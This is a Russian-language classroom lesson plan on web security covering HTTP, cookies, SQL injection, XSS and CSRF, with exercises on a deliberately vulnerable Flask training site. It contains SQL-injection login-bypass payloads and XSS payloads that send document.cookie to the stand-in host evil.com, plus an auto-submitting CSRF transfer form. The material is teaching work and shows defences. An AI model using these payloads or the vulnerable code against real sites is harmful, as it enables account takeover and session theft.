## 1. Теория (15 минут)

### 1.1. Как работает веб: запрос-ответ

**Схема работы:**
```
Браузер ——— (HTTP-запрос) ———> Веб-сервер
Браузер <—— (HTTP-ответ) ———— Веб-сервер
```

**Структура HTTP-запроса:**
```
GET /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session=abc123
```

**Структура HTTP-ответа:**
```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=xyz789
Content-Length: 1234

<!DOCTYPE html>
<html>...
```

**Коды ответа (знать обязательно):**
- 200 OK — всё хорошо
- 301/302 — перенаправление
- 403 Forbidden — доступ запрещён
- 404 Not Found — страница не найдена
- 500 Internal Server Error — ошибка сервера

### 1.2. Куки и сессии

**Cookie:** Небольшой файл, который сервер хранит на компьютере пользователя.
- Используется для: аутентификации, корзины покупок, настроек
- Может быть: сессионным (удаляется при закрытии) или постоянным (хранится N дней)
- **Угроза:** Если злоумышленник украл Cookie — он может войти в аккаунт без пароля

**Session ID:** Уникальный идентификатор, который хранится в Cookie.
- При каждом запросе браузер отправляет его серверу
- Сервер проверяет: "Этот Session ID принадлежит пользователю Иван"

**Вопрос ученику:** "Что будет, если злоумышленник украдет Cookie из браузера?"

### 1.3. OWASP Top 10 (адаптированный для школьников)

**OWASP (Open Web Application Security Project)** — это международный проект по безопасности веб-приложений. Раз в несколько лет они публикуют топ-10 самых опасных уязвимостей.

**Адаптированный топ (6 главных для понимания):**

1. **SQL-инъекция (SQLi)** — внедрение SQL-кода в запрос к базе данных
2. **XSS (Cross-Site Scripting)** — внедрение скрипта в страницу
3. **Нарушение аутентификации** — слабые пароли, утечка сессий
4. **Небезопасная конфигурация** — стандартные пароли, открытые порты
5. **Подделка межсайтовых запросов (CSRF)** — атака от имени пользователя
6. **Небезопасное хранение данных** — пароли в открытом виде

### 1.4. SQL-инъекции: как это работает

**Проблема:** Сайт подставляет пользовательский ввод прямо в SQL-запрос.

**Пример уязвимого кода:**
```python
query = "SELECT * FROM users WHERE login = '" + user_input + "' AND password = '" + pass_input + "'"
```

**Атака:** Пользователь вводит в поле логина: `admin' --`

**Результат:**
```sql
SELECT * FROM users WHERE login = 'admin' --' AND password = '...'
```
Всё, что после `--` — комментарий. Запрос выполняется без проверки пароля.

### 1.5. XSS: как это работает

**Типы XSS:**
- **Reflected XSS:** Скрипт в URL-параметре (одноразовый)
- **Stored XSS:** Скрипт сохранён на сервере (комментарий, профиль)
- **DOM XSS:** Скрипт на стороне клиента

**Пример:**
```
https://example.com/search?q=<script>alert('XSS')</script>
```
Если сайт не экранирует ввод — скрипт выполнится.

**Последствия XSS:**
1. Кража Cookie (`document.cookie` отправляется на сервер злоумышленника)
2. Перенаправление на фишинговый сайт
3. Изменение содержимого страницы

### Задание 2. SQL-инъекция на учебном сайте (15 минут)

**Инструкция:** Преподаватель поднимает учебный сайт (на Python Flask) или использует онлайн-тренажёр (например, DVWA, bWAPP, HackTheBox Academy).

**Вариант A: Локальный учебный сайт на Flask**

*Преподаватель заранее готовит скрипт:*

```python
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/login')
def login():
    username = request.args.get('username')
    password = request.args.get('password')
    
    # УЯЗВИМЫЙ КОД! Никогда не делайте так!
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    
    if cursor.fetchone():
        return "Добро пожаловать!"
    else:
        return "Неверный логин или пароль"
```

**Задания ученику:**

1. **Базовый вход:** Ввести `admin` / `admin` (стандартный пользователь в базе)
2. **SQL-инъекция 1:** В поле username ввести: `admin' --`
   - Ожидание: вход без пароля
3. **SQL-инъекция 2:** В поле username ввести: `' OR 1=1 --`
   - Ожидание: вход под первым пользователем в базе
4. **SQL-инъекция 3:** В поле username ввести: `' UNION SELECT * FROM users --`
   - Ожидание: получение всех пользователей
5. **Обход авторизации:** Ввести: `admin' OR '1'='1`
   - Ожидание: вход

**Вариант B: Если нет технической возможности — разбор на схемах**

Использовать SQL-тренажёр: https://www.sqlzoo.net/ или https://sqlbolt.com/

### Задание 3. XSS-атака на учебном сайте (15 минут)

**Инструкция:** Учебный сайт имеет поле поиска, которое отображает введённый текст без экранирования.

**Пример уязвимого кода:**
```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f"<h1>Результаты поиска для: {query}</h1>"
```

**Задания ученику:**

**1. Базовая XSS (Reflected):**
В URL ввести:
```
/search?q=<script>alert('XSS')</script>
```
Ожидание: всплывающее окно с текстом XSS.

**2. Кража Cookie (демонстрация принципа):**
Ввести:
```
/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```
Объяснить: в реальной атаке cookie отправляются на сервер злоумышленника.

**3. Stored XSS (теория):**
Представить: комментарий к посту содержит:
```html
<script>new Image().src='https://evil.com/steal?c='+document.cookie</script>
```
При загрузке страницы с комментарием — cookie уходят злоумышленнику.

**4. Защита от XSS:**
Показать, как должно быть:
```python
from flask import escape
return f"<h1>Результаты поиска для: {escape(query)}</h1>"
```
Попробовать ввести скрипт — он отобразится как текст, а не как код.

**Вопросы ученику:**
1. Чем отличается Reflected XSS от Stored XSS?
2. Что может сделать злоумышленник с помощью XSS?
3. Как защититься от XSS? (экранирование вывода, Content-Security-Policy)

### Задание 5. CSRF-атака (разбор по схеме, 10 минут)

**Инструкция:** Разобрать схему CSRF (Cross-Site Request Forgery) — подделка межсайтового запроса.

**Сценарий:**
1. Пользователь авторизован на сайте банка (cookie в браузере)
2. Пользователь открывает другой сайт (злоумышленника)
3. На сайте злоумышленника есть невидимая форма:
```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker_account">
  <input type="hidden" name="amount" value="10000">
  <input type="submit" id="auto-submit">
</form>
<script>document.getElementById('auto-submit').click();</script>
```
4. Браузер отправляет запрос на банк вместе с cookie
5. Банк выполняет перевод — думает, что это действие пользователя

**Защита от CSRF:**
- CSRF-токен (случайная строка в форме, которая проверяется на сервере)
- SameSite Cookie (атрибут cookie: `SameSite=Strict` или `SameSite=Lax`)
- Проверка Referer-заголовка

**Вопрос ученику:**

2. Как защититься от CSRF?
3. В чём разница между XSS и CSRF?
